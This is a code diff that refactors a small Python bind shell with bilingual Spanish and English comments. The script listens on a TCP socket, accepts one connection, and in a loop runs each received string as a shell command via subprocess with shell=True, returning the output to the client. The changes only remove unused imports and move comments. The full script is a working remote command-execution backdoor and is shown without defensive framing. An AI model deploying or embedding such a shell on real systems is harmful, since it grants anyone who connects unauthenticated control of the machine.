@@ -3,8 +3,6 @@
 # Modules #
 
 import socket
-import sys
-import time
 import subprocess
 
 # Creates a TCP/IP socket
@@ -21,9 +19,13 @@ sock.bind(server_address)
 sock.listen(1)
 (sock, (host_c, puerto_c)) = sock.accept()
 while True:
-    cmd = sock.recv(100000)  # recibimos 100000 bytes de datos
-    # (EN) Receives 100000 bytes of data
 
+    # recibe 100000 bytes de datos
+    # (EN) Receives 100000 bytes of data
+    cmd = sock.recv(100000)
+
+    # Inicia un nuevo proceso, recibido por recv y guardado en cmd
+    # (EN) Starts a new process, received by recv and saved in cmd
     output = subprocess.Popen(
         cmd,
         shell=True,
@@ -32,13 +34,12 @@ while True:
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         close_fds=True,
-        )
+    )
 
-    # Inicia un nuevo proceso, recibido por recv y guardado en cmd
-    # (EN) Starts a new process, received by recv and saved in cmd
-
-    out = output.stdout.read()  # leemos la salida de dicho proceso
+    # leemos la salida de dicho proceso
     # (EN) Reads the output of the process
+    out = output.stdout.read()
 
-    sock.send(out)  # enviamos la salida del proceso al cliente
+    # enviamos la salida del proceso al cliente
     # (EN) Sends the process output to the client
+    sock.send(out)
